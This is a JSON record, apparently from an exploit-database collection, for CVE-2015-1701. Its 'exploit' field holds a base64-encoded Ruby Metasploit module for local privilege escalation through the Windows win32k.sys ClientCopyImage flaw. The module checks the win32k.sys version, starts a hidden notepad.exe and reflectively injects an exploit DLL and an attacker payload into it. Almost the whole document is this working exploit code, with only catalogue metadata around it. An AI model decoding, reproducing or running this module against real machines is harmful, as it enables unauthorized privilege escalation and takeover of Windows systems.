{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ21zZi9jb3JlL3Bvc3Qvd2luZG93cy9yZWZsZWN0aXZlX2RsbF9pbmplY3Rpb24nDQpyZXF1aXJlICdyZXgnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpMb2NhbA0KICBSYW5rID0gTm9ybWFsUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpGaWxlDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcml2DQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcm9jZXNzDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpGaWxlSW5mbw0KICBpbmNsdWRlIE1zZjo6UG9zdDo6V2luZG93czo6UmVmbGVjdGl2ZURMTEluamVjdGlvbg0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywgew0KICAgICAgJ05hbWUnICAgICAgICAgICAgPT4gJ1dpbmRvd3MgQ2xpZW50Q29weUltYWdlIFdpbjMyayBFeHBsb2l0JywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgID0+ICVxew0KICAgICAgICBUaGlzIG1vZHVsZSBleHBsb2l0cyBpbXByb3BlciBvYmplY3QgaGFuZGxpbmcgaW4gdGhlIHdpbjMyay5zeXMga2VybmVsIG1vZGUgZHJpdmVyLg0KICAgICAgICBUaGlzIG1vZHVsZSBoYXMgYmVlbiB0ZXN0ZWQgb24gdnVsbmVyYWJsZSBidWlsZHMgb2YgV2luZG93cyA3IHg2NCBhbmQgeDg2LCBhbmQNCiAgICAgICAgV2luZG93cyAyMDA4IFIyIFNQMSB4NjQuDQogICAgICB9LA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnQXV0aG9yJyAgICAgICAgICA9PiBbDQogICAgICAgICAgJ1Vua25vd24nLCAgICAjIHZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5IGFuZCBleHBsb2l0IGluIHRoZSB3aWxkDQogICAgICAgICAgJ2hmaXJlZm94JywgICAjIENvZGUgcmVsZWFzZWQgb24gZ2l0aHViDQogICAgICAgICAgJ09KIFJlZXZlcycgICAjIG1zZiBtb2R1bGUNCiAgICAgICAgXSwNCiAgICAgICdBcmNoJyAgICAgICAgICAgID0+IFsgQVJDSF9YODYsIEFSQ0hfWDg2XzY0IF0sDQogICAgICAnUGxhdGZvcm0nICAgICAgICA9PiAnd2luJywNCiAgICAgICdTZXNzaW9uVHlwZXMnICAgID0+IFsgJ21ldHJlcHJldGVyJyBdLA0KICAgICAgJ0RlZmF1bHRPcHRpb25zJyAgPT4gew0KICAgICAgICAgICdFWElURlVOQycgICAgPT4gJ3RocmVhZCcsDQogICAgICAgIH0sDQogICAgICAnVGFyZ2V0cycgICAgICAgICA9PiBbDQogICAgICAgICAgWyAnV2luZG93cyB4ODYnLCB7ICdBcmNoJyA9PiBBUkNIX1g4NiB9IF0sDQogICAgICAgICAgWyAnV2luZG93cyB4NjQnLCB7ICdBcmNoJyA9PiBBUkNIX1g4Nl82NCB9IF0NCiAgICAgICAgXSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgID0+IHsNCiAgICAgICAgICAnU3BhY2UnICAgICAgID0+IDQwOTYsDQogICAgICAgICAgJ0Rpc2FibGVOb3BzJyA9PiB0cnVlDQogICAgICAgIH0sDQogICAgICAnUmVmZXJlbmNlcycgICAgICA9PiBbDQogICAgICAgICAgWydDVkUnLCAnMjAxNS0xNzAxJ10sDQogICAgICAgICAgWydNU0InLCAnTVMxNS0wNTEnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL3d3dy5maXJlZXllLmNvbS9ibG9nL3RocmVhdC1yZXNlYXJjaC8yMDE1LzA0L3Byb2JhYmxlX2FwdDI4X3VzZW8uaHRtbCddLA0KICAgICAgICAgIFsnVVJMJywgJ2h0dHBzOi8vZ2l0aHViLmNvbS9oZmlyZWYweC9DVkUtMjAxNS0xNzAxJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vbGlicmFyeS9zZWN1cml0eS9NUzE1LTA1MSddDQogICAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnICA9PiAnTWF5IDEyIDIwMTUnLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICAgPT4gMA0KICAgIH0pKQ0KICBlbmQNCg0KICBkZWYgY2hlY2sNCiAgICAjIFdpbmRvd3MgU2VydmVyIDIwMDggRW50ZXJwcmlzZSBTUDIgKDMyLWJpdCkgIDYuMC42MDAyLjE4MDA1IChEb2VzIG5vdCB3b3JrKQ0KICAgICMgV2lub2R3cyA3IFNQMSAoNjQtYml0KSAgICAgICAgICAgICAgICAgICAgICAgNi4xLjc2MDEuMTc1MTQgKFdvcmtzKQ0KICAgICMgV2luZG93cyA3IFNQMSAoMzItYml0KSAgICAgICAgICAgICAgICAgICAgICAgNi4xLjc2MDEuMTc1MTQgKFdvcmtzKQ0KICAgICMgV2luZG93cyBTZXJ2ZXIgMjAwOCBSMiAoNjQtYml0KSBTUDEgICAgICAgICAgNi4xLjc2MDEuMTc1MTQgKFdvcmtzKQ0KDQogICAgaWYgc3lzaW5mb1snT1MnXSAhfiAvd2luZG93cy9pDQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQogICAgZW5kDQoNCiAgICBpZiBzeXNpbmZvWydBcmNoaXRlY3R1cmUnXSA9fiAvKHdvd3x4KTY0L2kNCiAgICAgIGFyY2ggPSBBUkNIX1g4Nl82NA0KICAgIGVsc2lmIHN5c2luZm9bJ0FyY2hpdGVjdHVyZSddID1+IC94ODYvaQ0KICAgICAgYXJjaCA9IEFSQ0hfWDg2DQogICAgZW5kDQoNCiAgICBmaWxlX3BhdGggPSBleHBhbmRfcGF0aCgnJXdpbmRpciUnKSA8PCAnXFxzeXN0ZW0zMlxcd2luMzJrLnN5cycNCiAgICBtYWpvciwgbWlub3IsIGJ1aWxkLCByZXZpc2lvbiwgYnJhbmNoID0gZmlsZV92ZXJzaW9uKGZpbGVfcGF0aCkNCiAgICB2cHJpbnRfc3RhdHVzKCJ3aW4zMmsuc3lzIGZpbGUgdmVyc2lvbjogI3ttYWpvcn0uI3ttaW5vcn0uI3tidWlsZH0uI3tyZXZpc2lvbn0gYnJhbmNoOiAje2JyYW5jaH0iKQ0KDQogICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZSBpZiBidWlsZCA9PSA3NjAxDQoNCiAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpEZXRlY3RlZA0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIGlmIGlzX3N5c3RlbT8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb25lLCAnU2Vzc2lvbiBpcyBhbHJlYWR5IGVsZXZhdGVkJykNCiAgICBlbmQNCg0KICAgIGlmIGNoZWNrID09IEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZSB8fCBjaGVjayA9PSBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAnRXhwbG9pdCBub3QgYXZhaWxhYmxlIG9uIHRoaXMgc3lzdGVtLicpDQogICAgZW5kDQoNCiAgICBpZiBzeXNpbmZvWydBcmNoaXRlY3R1cmUnXSA9fiAvd293NjQvaQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vVGFyZ2V0LCAnUnVubmluZyBhZ2FpbnN0IFdPVzY0IGlzIG5vdCBzdXBwb3J0ZWQnKQ0KICAgIGVsc2lmIHN5c2luZm9bJ0FyY2hpdGVjdHVyZSddID1+IC94NjQvICYmIHRhcmdldC5hcmNoLmZpcnN0ID09IEFSQ0hfWDg2DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm9UYXJnZXQsICdTZXNzaW9uIGhvc3QgaXMgeDY0LCBidXQgdGhlIHRhcmdldCBpcyBzcGVjaWZpZWQgYXMgeDg2JykNCiAgICBlbHNpZiBzeXNpbmZvWydBcmNoaXRlY3R1cmUnXSA9fiAveDg2LyAmJiB0YXJnZXQuYXJjaC5maXJzdCA9PSBBUkNIX1g4Nl82NA0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vVGFyZ2V0LCAnU2Vzc2lvbiBob3N0IGlzIHg4NiwgYnV0IHRoZSB0YXJnZXQgaXMgc3BlY2lmaWVkIGFzIHg2NCcpDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoJ0xhdW5jaGluZyBub3RlcGFkIHRvIGhvc3QgdGhlIGV4cGxvaXQuLi4nKQ0KICAgIG5vdGVwYWRfcHJvY2VzcyA9IGNsaWVudC5zeXMucHJvY2Vzcy5leGVjdXRlKCdub3RlcGFkLmV4ZScsIG5pbCwgeydIaWRkZW4nID0+IHRydWV9KQ0KICAgIGJlZ2luDQogICAgICBwcm9jZXNzID0gY2xpZW50LnN5cy5wcm9jZXNzLm9wZW4obm90ZXBhZF9wcm9jZXNzLnBpZCwgUFJPQ0VTU19BTExfQUNDRVNTKQ0KICAgICAgcHJpbnRfZ29vZCgiUHJvY2VzcyAje3Byb2Nlc3MucGlkfSBsYXVuY2hlZC4iKQ0KICAgIHJlc2N1ZSBSZXg6OlBvc3Q6Ok1ldHJlcHJldGVyOjpSZXF1ZXN0RXJyb3INCiAgICAgICMgUmVhZGVyIFNhbmRib3ggd29uJ3QgYWxsb3cgdG8gY3JlYXRlIGEgbmV3IHByb2Nlc3M6DQogICAgICAjIHN0ZGFwaV9zeXNfcHJvY2Vzc19leGVjdXRlOiBPcGVyYXRpb24gZmFpbGVkOiBBY2Nlc3MgaXMgZGVuaWVkLg0KICAgICAgcHJpbnRfc3RhdHVzKCdPcGVyYXRpb24gZmFpbGVkLiBUcnlpbmcgdG8gZWxldmF0ZSB0aGUgY3VycmVudCBwcm9jZXNzLi4uJykNCiAgICAgIHByb2Nlc3MgPSBjbGllbnQuc3lzLnByb2Nlc3Mub3Blbg0KICAgIGVuZA0KDQogICAgcHJpbnRfc3RhdHVzKCJSZWZsZWN0aXZlbHkgaW5qZWN0aW5nIHRoZSBleHBsb2l0IERMTCBpbnRvICN7cHJvY2Vzcy5waWR9Li4uIikNCiAgICBpZiB0YXJnZXQuYXJjaC5maXJzdCA9PSBBUkNIX1g4Ng0KICAgICAgZGxsX2ZpbGVfbmFtZSA9ICdjdmUtMjAxNS0xNzAxLng4Ni5kbGwnDQogICAgZWxzZQ0KICAgICAgZGxsX2ZpbGVfbmFtZSA9ICdjdmUtMjAxNS0xNzAxLng2NC5kbGwnDQogICAgZW5kDQoNCiAgICBsaWJyYXJ5X3BhdGggPSA6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE1LTE3MDEnLCBkbGxfZmlsZV9uYW1lKQ0KICAgIGxpYnJhcnlfcGF0aCA9IDo6RmlsZS5leHBhbmRfcGF0aChsaWJyYXJ5X3BhdGgpDQoNCiAgICBwcmludF9zdGF0dXMoIkluamVjdGluZyBleHBsb2l0IGludG8gI3twcm9jZXNzLnBpZH0uLi4iKQ0KICAgIGV4cGxvaXRfbWVtLCBvZmZzZXQgPSBpbmplY3RfZGxsX2ludG9fcHJvY2Vzcyhwcm9jZXNzLCBsaWJyYXJ5X3BhdGgpDQoNCiAgICBwcmludF9zdGF0dXMoIkV4cGxvaXQgaW5qZWN0ZWQuIEluamVjdGluZyBwYXlsb2FkIGludG8gI3twcm9jZXNzLnBpZH0uLi4iKQ0KICAgIHBheWxvYWRfbWVtID0gaW5qZWN0X2ludG9fcHJvY2Vzcyhwcm9jZXNzLCBwYXlsb2FkLmVuY29kZWQpDQoNCiAgICAjIGludm9rZSB0aGUgZXhwbG9pdCwgcGFzc2luZyBpbiB0aGUgYWRkcmVzcyBvZiB0aGUgcGF5bG9hZCB0aGF0DQogICAgIyB3ZSB3YW50IGludm9rZWQgb24gc3VjY2Vzc2Z1bCBleHBsb2l0YXRpb24uDQogICAgcHJpbnRfc3RhdHVzKCdQYXlsb2FkIGluamVjdGVkLiBFeGVjdXRpbmcgZXhwbG9pdC4uLicpDQogICAgcHJvY2Vzcy50aHJlYWQuY3JlYXRlKGV4cGxvaXRfbWVtICsgb2Zmc2V0LCBwYXlsb2FkX21lbSkNCg0KICAgIHByaW50X2dvb2QoJ0V4cGxvaXQgZmluaXNoZWQsIHdhaXQgZm9yIChob3BlZnVsbHkgcHJpdmlsZWdlZCkgcGF5bG9hZCBleGVjdXRpb24gdG8gY29tcGxldGUuJykNCiAgZW5kDQoNCmVuZA==", 
    "filename": "platforms/windows/local/37367.rb", 
    "id": "37367", 
    "cves": [
        "CVE-2015-1701"
    ]
}